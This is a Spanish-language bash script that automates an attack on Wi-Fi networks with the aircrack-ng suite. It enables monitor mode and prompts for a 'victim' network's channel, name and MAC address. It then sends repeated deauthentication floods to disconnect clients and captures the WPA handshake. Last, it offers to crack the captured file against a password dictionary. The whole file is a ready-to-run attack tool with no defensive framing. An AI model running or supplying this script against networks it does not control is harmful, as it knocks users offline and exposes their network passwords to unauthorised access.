#!/bin/bash
clear
figlet handshake automation
echo "Escrito por: mmaganadebia."
echo ""
read -p "Hola $USER, ¿Quieres comenzar? (si / no): " firstDecision

firstTerminal(){
  xterm -hold -e sudo airodump-ng -c $canal --bssid $mac wlan0mon &
}

aircrackInstall(){
  read -p "¿Quieres instalar aircrack-ng? Es necesaria (si/no)" aircrackDecision
  case $aircrackDecision in
    si)
      sudo apt-get install aircrack-ng
      ;;
    no)
     echo "Saliendo del script..."
  esac
}

figletInstall(){
  read -p "¿Quieres instalar fliglet? solo es para el banner (si / no)" figletDecision
  case $figletDecision  in
    si)
      sudo apt-get install figlet
      ;;
    no)
      echo "Correcto..."
  esac
}

verifTools(){
  sudo dpkg -l aircrack-ng &> /dev/null && echo "aircrack-ng instalada..." || aircrackInstall
  sudo dpkg -l figlet &> /dev/null && echo "figlet instalado..." || figletInstall
}

deauthentication(){
  read -p "¿Quieres enviar otro ataque de desautenticación? (si / no) " deauth
  case $deauth in
    si)
      sudo aireplay-ng -0 10 -a $mac  -e $red wlan0mon
      deauthentication
      ;;
    no)
      dictionariOrSave
esac
}

dictionariOrSave(){
  read -p "¿Quieres intentar decifrar con un diccionario o guardar el handshake? [ D(diccionario) / G(guardar) ] " doc
  case $doc in
    D)
      read -p "Escribe la ruta del diccionario: " diccionario
      xterm -hold -e sudo aircrack-ng "$red"'-01.cap' -w "$diccionario" &
      sudo service NetworkManager start
      sudo airmon-ng stop wlan0mon
      exit
     ;;
    G)
      echo "Saliendo..."
      sleep 2s
      sudo service NetworkManager start
      sudo airmon-ng stop wlan0mon
      exit
  esac
}

case $firstDecision in
  si)
    echo "Verificando herramientas instaladas"
    verifTools
    echo "Comenzando..."
    echo "Matando procesos que pueden interferir..."
    sudo airmon-ng check kill
    echo "Poniendo interfaz en modo monitor..."
    sudo airmon-ng start wlan0
    echo "Escaneando redes..."
    echo "Puedes detener el escaneo cuando quieras con ctrl +c"
    sleep 5s
    sudo airodump-ng wlan0mon 
    read -p "Canal de la victima: " canal
    read -p "Nombre de la red: " red
    read -p "Direccion MAC: " mac 
    firstTerminal 
    sleep 5s 
    sudo aireplay-ng -0 10 -a $mac  -e $red wlan0mon
    deauthentication
    ;;
  no)
    echo "Saliendo del script."
    echo "¡Adios!"
    sleep 2s
    exit
esac
